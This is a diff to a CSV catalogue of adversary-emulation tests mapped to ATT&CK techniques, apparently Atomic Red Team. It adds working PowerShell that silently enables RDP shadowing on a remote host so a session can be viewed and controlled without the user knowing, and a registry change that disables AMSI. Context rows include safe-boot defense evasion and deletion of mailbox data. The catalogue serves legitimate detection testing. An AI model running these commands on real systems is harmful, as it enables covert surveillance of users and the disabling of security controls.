@@ -13302,6 +13302,19 @@ T1112,Modify Registry,Disable Windows Prefetch Through Registry,7979dd41-2045-48
 ",windows,,,"reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters"" /v ""EnablePrefetcher"" /t REG_DWORD /d 0 /f
 ",command_prompt,True,,"reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters"" /v ""EnablePrefetcher"" /t REG_DWORD /d 3 /f
 ",,,
+T1112,Modify Registry,Setting Shadow key in Registry for RDP Shadowing,ac494fe5-81a4-4897-af42-e774cf005ecb,"Microsoft Remote Desktop Protocol (RDP) supports a “shadowing” feature and RDP is available in all Windows Server Operating Systems and the business editions of end-user Windows versions.
+In order to use the RDP shadowing feature, the Remote Desktop Services (TermService) service needs to be running (which it does by default), a rule needs to be enabled in the Windows Firewall and in case of stealth reasons, a setting needs to be configured to not prompt the user for permission when they are being shadowed.
+In order to configure RDP shadowing session in a quiet mode.  The registry of a remote system can be updated using several protocols, depending on the accessible ports and configuration of the services listening on those ports. Our aim is to set the Shadow value in HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services on the remote machine to 2, which allows us to both view and control the session without the user being informed.
+[Reference](https://blog.bitsadmin.com/spying-on-users-using-rdp-shadowing)",windows,,,"$s= New-CimSession -Computername #{server_name} -SessionOption (New-CimSessionOption -Protocol Dcom)
+Get-CimInstance -Namespace ROOT\StandardCimv2 -ClassName MSFT_NetFirewallRule -Filter 'DisplayName=""Remote Desktop - Shadow (TCP-In)""' -CimSession $s | Invoke-CimMethod -MethodName Enable
+Invoke-CimMethod -ClassName StdRegProv -MethodName SetDWORDValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName=""Software\Policies\Microsoft\Windows NT\Terminal Services""; sValueName=""shadow""; uValue=[uint32]2} -CimSession $s",powershell,True,,"Invoke-CimMethod -ClassName StdRegProv -MethodName DeleteValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName=""Software\Policies\Microsoft\Windows NT\Terminal Services""; sValueName=""Shadow""} -CimSession $s
+",,,"input_arguments.server_name.description: The remote server that we need to shadow and have to do the registry modification.
+
+input_arguments.server_name.type: string
+
+input_arguments.server_name.default: localhost
+
+"
 T1562.009,Impair Defenses: Safe Boot Mode,Safe Mode Boot,2a78362e-b79a-4482-8e24-be397bce4d85,Allows adversaries to abuse safe mode to disable endpoint defenses that may not start with limited boot,windows,,,bcdedit /set safeboot network,command_prompt,True,,bcdedit /deletevalue {current} safeboot,,,
 T1070.008,Email Collection: Mailbox Manipulation,Copy and Delete Mailbox Data on Windows,d29f01ea-ac72-4efc-8a15-bea64b77fabf,"Copies and deletes mail data on Windows
 ",windows,,,"New-Item -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -ItemType Directory -ErrorAction Ignore
@@ -14905,6 +14918,12 @@ Write-Host ""Registry value created: $newValueName with data $newValueData""
 
 Remove-ItemProperty -Path $registryPath -Name $newValueName
 Write-Host ""Registry value deleted: $newValueName""",powershell,True,,,,,
+T1562.001,Impair Defenses: Disable or Modify Tools,AMSI Bypass - Create AMSIEnable Reg Key,728eca7b-0444-4f6f-ac36-437e3d751dc0,"Threat Actor could disable the AMSI function by adding a registry value name “AmsiEnable” to the registry key “HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable” and set its value to 0.
+Ref: https://mostafayahiax.medium.com/hunting-for-amsi-bypassing-methods-9886dda0bf9d
+",windows,,,"New-Item -Path ""HKCU:\Software\Microsoft\Windows Script\Settings"" -Force | Out-Null
+New-ItemProperty -Path ""HKCU:\Software\Microsoft\Windows Script\Settings"" -Name ""AmsiEnable"" -Value 0 -PropertyType DWORD -Force | Out-Null
+",powershell,True,,"Remove-Item -Path ""HKCU:\Software\Microsoft\Windows Script\Settings"" -Recurse -Force 2> $null
+",,,
 T1037.004,Boot or Logon Initialization Scripts: Rc.common,rc.common,97a48daa-8bca-4bc0-b1a9-c1d163e762de,"Modify rc.common
 
 [Reference](https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/StartupItems.html)
